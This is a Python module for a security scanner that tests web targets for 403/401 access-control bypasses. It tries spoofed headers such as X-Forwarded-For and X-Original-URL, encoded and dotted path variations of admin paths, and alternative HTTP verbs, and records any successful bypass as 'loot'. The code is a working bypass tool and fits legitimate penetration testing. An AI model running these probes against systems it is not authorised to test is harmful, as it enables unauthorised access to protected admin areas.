from scan_engine.helpers.http_client import get_session
from urllib.parse import urlparse

class BypassExpertScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        # Expanded Header List (inspired by dontgo403)
        self.headers_payloads = {
            "X-Originating-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded": "127.0.0.1",
            "Forwarded-For": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-ProxyUser-Ip": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Host": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1"
        }
        
        # Path Permutations
        self.path_payloads = [
            "/%2e/{}",           # /%2e/admin
            "/{}/.",             # /admin/.
            "//{}",              # //admin
            "/./{}",             # /./admin
            "/{}/",              # /admin/
            "/{};/",             # /admin;/
            "/..;/{}/",          # /..;/admin/
            "/{}\t",             # /admin%09
            "/{}/%20",           # /admin%20
            "/{}.html",          # /admin.html
            "/{}.json",          # /admin.json
            "/{}/..;/",          # /admin/..;/
            "/{}.php",           # /admin.php
            "/{}/?",             # /admin/?
            "/{}/#",             # /admin/#
            "/{}.wd"             # /admin.wd (random ext)
        ]

    def _candidate_paths(self, candidate_urls=None):
        protected_paths = ["/admin", "/api/admin", "/dashboard", "/console"]
        for candidate in candidate_urls or []:
            if not isinstance(candidate, str):
                continue
            try:
                parsed = urlparse(candidate)
                path = parsed.path or "/"
            except Exception:
                path = str(candidate or "").strip()
            if not path.startswith("/") or path == "/":
                continue
            if path not in protected_paths:
                protected_paths.append(path)
        return protected_paths[:12]

    def scan_403_bypass(self, port, protocol='http', logger=None, candidate_urls=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        protected_paths = self._candidate_paths(candidate_urls)
        
        if logger: logger(f"🚫 403 Expert: Testing advanced bypass techniques on {len(protected_paths)} paths...", "INFO")

        for path in protected_paths:
            target_url = base_url + path
            
            try:
                # 1. Baseline Check
                s = get_session(self.options)
                r_base = s.get(target_url, verify=True, allow_redirects=False, timeout=5)
                
                # Only bypass if we hit a 403 or 401
                if r_base.status_code not in [403, 401]:
                    continue
                
                if logger: logger(f"   Targeting {path} (Status: {r_base.status_code})...", "DEBUG")

                # 2. Header Bypass
                for h, v in self.headers_payloads.items():
                    try:
                        # Special handling for Rewrite headers which take the path
                        val = v
                        if h in ["X-Original-URL", "X-Rewrite-URL"]:
                            val = path
                            
                        r_test = s.get(target_url, headers={h: val}, verify=True, allow_redirects=False, timeout=3)
                        
                        if r_test.status_code == 200:
                            findings.append({
                                "title": f"CRITICAL: 403 Bypass via Header ({h})",
                                "description": f"Accessed protected resource `{path}` (Baseline: {r_base.status_code}) using header `{h}: {val}`. Status: 200 OK.",
                                "severity": "critical",
                                "tool_source": "bypass_expert",
                                "raw_loot": f"Bypass: {target_url} | Header: {h}: {val}"
                            })
                            if logger: logger(f"🔓 BYPASS SUCCESS: {path} via {h}", "CRITICAL")
                            return findings # Return on first critical win
                            
                        elif r_test.status_code not in [403, 401] and r_test.status_code != r_base.status_code:
                             # Interesting status change (e.g. 500, 302, 404)
                             pass 
                             
                    except Exception:
                        continue

                # 3. Path Permutation Bypass
                path_clean = path.strip("/")
                for pattern in self.path_payloads:
                    try:
                        # Construct payload
                        # pattern is like "/%2e/{}"
                        # we want "/%2e/admin"
                        # But wait, base_url already has protocol://host:port
                        # So we need to construct the full url
                        
                        variation = pattern.format(path_clean)
                        # Ensure leading slash
                        if not variation.startswith("/"): variation = "/" + variation
                        
                        url_var = base_url + variation
                        
                        r_var = s.get(url_var, verify=True, allow_redirects=False, timeout=3)
                        
                        if r_var.status_code == 200:
                            findings.append({
                                "title": f"High: 403 Bypass via Path Permutation",
                                "description": (
                                    f"Accessed protected resource `{path}` using variation `{variation}`.\n"
                                    f"Original Status: {r_base.status_code} -> New Status: 200 OK."
                                ),
                                "severity": "high",
                                "tool_source": "bypass_expert",
                                "raw_loot": url_var
                            })
                            if logger: logger(f"🔓 BYPASS SUCCESS: {path} via {variation}", "CRITICAL")
                            return findings

                    except Exception:
                        continue
                    
                # 4. HTTP Verb Bypass (Simple)
                for verb in ["POST", "PUT", "TRACE", "HEAD"]:
                    try:
                        r_verb = s.request(verb, target_url, verify=True, allow_redirects=False, timeout=3)
                        if r_verb.status_code == 200:
                            findings.append({
                                "title": f"Medium: 403 Bypass via HTTP Verb ({verb})",
                                "description": f"Resource `{path}` is accessible via {verb} method (Original: {r_base.status_code}).",
                                "severity": "medium",
                                "tool_source": "bypass_expert",
                                "raw_loot": f"{verb} {target_url}"
                            })
                    except Exception:
                        continue

            except Exception:
                pass
                
        return findings
